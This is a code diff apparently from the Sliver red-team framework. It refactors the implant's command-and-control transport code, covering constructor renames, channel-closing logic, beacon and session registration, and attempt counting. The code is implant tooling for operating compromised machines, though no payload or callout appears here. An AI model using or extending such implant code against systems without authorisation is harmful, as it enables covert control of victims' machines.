@@ -58,7 +58,7 @@ import (
 type C2 struct {
 	ID     string        // Short ID  for easy selection
 	mutex  *sync.RWMutex // Concurrency management
-	closed chan bool     // Notify the transport goroutines we're closed
+	closed chan struct{} // Notify the transport goroutines we're closed
 
 	// The priority of use of this implant, simply increased at load time by C2s struct
 	Priority int
@@ -100,15 +100,15 @@ type C2 struct {
 	// {{end}}
 }
 
-// NewC2FromBytes - Eventually, we should have all supported transport transports being
+// NewMalleableFromBytes - Eventually, we should have all supported transport transports being
 // instantiated with this function. It will perform all filtering and setup
 // according to the complete URI passed as parameter, and classic templating.
-func NewC2FromBytes(profileData string) (t *C2, err error) {
+func NewMalleableFromBytes(profileData string) (t *C2, err error) {
 
 	// Base transport settings
 	t = &C2{
 		mutex:      &sync.RWMutex{},
-		closed:     make(chan bool, 1),
+		closed:     make(chan struct{}),
 		failures:   0,
 		attempts:   0,
 		Profile:    &sliverpb.Malleable{},
@@ -141,14 +141,14 @@ func NewC2FromBytes(profileData string) (t *C2, err error) {
 	return
 }
 
-// NewC2FromProfile - Generate a kinda ready C2 channel driver, from a profile.
-func NewC2FromProfile(p *sliverpb.Malleable) (t *C2, err error) {
+// NewMalleableFromProfile - Generate a kinda ready C2 channel driver, from a profile.
+func NewMalleableFromProfile(p *sliverpb.Malleable) (t *C2, err error) {
 
 	// Base transport settings
 	t = &C2{
 		ID:         p.ID,
 		mutex:      &sync.RWMutex{},
-		closed:     make(chan bool, 1),
+		closed:     make(chan struct{}),
 		failures:   0,
 		attempts:   0,
 		Profile:    p,
@@ -178,6 +178,7 @@ func NewC2FromProfile(p *sliverpb.Malleable) (t *C2, err error) {
 
 // Start the transport as it is currently configured and instantiated.
 func (t *C2) Start(isSwitch bool, oldTransportID string) (err error) {
+	t.attempts = t.attempts + 1
 
 	// Basic security values that need to be set
 	cryptography.TOTPSecret = string(t.Profile.Credentials.TOTPServerSecret)
@@ -200,6 +201,11 @@ func (t *C2) Start(isSwitch bool, oldTransportID string) (err error) {
 	if err != nil {
 		return
 	}
+
+	t.mutex.RLock()
+	t.closed = make(chan struct{}) // The transport is not closed anymore, if it was
+	t.Profile.Active = true
+	t.mutex.RUnlock()
 
 	// Register this session
 	err = t.Register(isSwitch, oldTransportID)
@@ -224,6 +230,7 @@ func (t *C2) Start(isSwitch bool, oldTransportID string) (err error) {
 
 		go t.ServeBeacon()
 	}
+
 	return
 }
 
@@ -248,7 +255,6 @@ func (t *C2) Register(isSwitch bool, oldTransportID string) (err error) {
 	// Short registration if we were just switching
 	if isSwitch {
 		t.Connection.RequestSend(t.registerSwitch(oldTransportID))
-		t.Profile.Active = true // This C2 is now active
 		return
 	}
 
@@ -273,9 +279,6 @@ func (t *C2) Register(isSwitch bool, oldTransportID string) (err error) {
 		time.Sleep(time.Second)
 	}
 
-	// This C2 is now active
-	t.Profile.Active = true
-
 	return
 }
 
@@ -289,7 +292,9 @@ func (t *C2) Stop() (err error) {
 
 	// Notify all goroutines we're done. This is used
 	// to stop beaconing loops, but the chan is non-blocking.
-	t.closed <- true
+	if t.Profile.Type == sliverpb.C2Type_Beacon {
+		close(t.closed)
+	}
 
 	// Close the RPC connection per se.
 	err = t.Connection.Close()
@@ -425,7 +430,6 @@ func (t *C2) registerSwitch(oldTransportID string) *sliverpb.Envelope {
 		OldTransportID: oldTransportID,
 		TransportID:    t.ID,
 		RemoteAddress:  t.uri.String(),
-		Session:        t.registerSliver(),
 		Response:       &commonpb.Response{},
 	}
 
@@ -433,10 +437,13 @@ func (t *C2) registerSwitch(oldTransportID string) *sliverpb.Envelope {
 		nextBeacon := time.Now().Add(t.Duration())
 		register.Beacon = &sliverpb.BeaconRegister{
 			ID:          BeaconID,
+			Register:    t.registerSliver(),
 			Interval:    t.Profile.Interval,
 			Jitter:      t.Profile.Jitter,
 			NextCheckin: nextBeacon.UTC().Unix(),
 		}
+	} else {
+		register.Session = t.registerSliver()
 	}
 
 	data, err := proto.Marshal(register)
@@ -458,5 +465,8 @@ func (t *C2) registerSwitch(oldTransportID string) *sliverpb.Envelope {
 func (t *C2) FailedAttempt() {
 	t.mutex.RLock()
 	defer t.mutex.RUnlock()
-	t.attempts = t.attempts + 1
+	if t.failures > 0 {
+		t.attempts = t.attempts + 1
+	}
+	t.failures = t.failures + 1
 }
